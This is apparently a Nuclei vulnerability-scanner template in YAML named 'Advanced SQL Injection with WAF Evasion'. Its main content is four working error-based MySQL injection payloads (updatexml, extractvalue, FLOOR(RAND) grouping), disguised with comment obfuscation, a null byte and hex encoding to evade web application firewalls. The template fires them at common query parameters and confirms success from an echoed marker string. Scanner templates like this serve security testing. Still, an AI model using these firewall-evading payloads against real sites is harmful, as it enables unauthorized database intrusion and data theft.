http:
- matchers:
  - part: body
    type: word
    words:
    - SQLi_Success
  - status:
    - 200
    type: status
  - negative: true
    part: body
    type: word
    words:
    - Forbidden
    - Access Denied
    - Your client does not have permission
    - WAF
    - Cloudflare
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?id={{payload}}'
  - '{{BaseURL}}/?search={{payload}}'
  - '{{BaseURL}}/?query={{payload}}'
  - '{{BaseURL}}/?page={{payload}}'
  payloads:
    payload:
    - 1'/*!AND*/(updatexml(1,concat(0x7e,(select+0x53514c695f53756363657373),0x7e),1))--+-
    - 1e0'/*!AND*/extractvalue(1,concat(0x7e,0x53514c695f53756363657373))--+-
    - 1'/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT/**/COUNT(*),CONCAT(0x7e,0x53514c695f53756363657373,0x7e,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)--+-
    - 1'%00/*!AND*/(updatexml(1,concat(0x7e,0x53514c695f53756363657373),1))--+-
  stop-at-first-match: true
id: waf-bypass-sqli-precision
info:
  author: nawab-hacker
  description: Targeted at bypassing firewalls using comment-level obfuscation and
    hex encoding.
  name: Advanced SQL Injection with WAF Evasion
  severity: critical
  tags: sqli, advanced, waf-bypass, precision
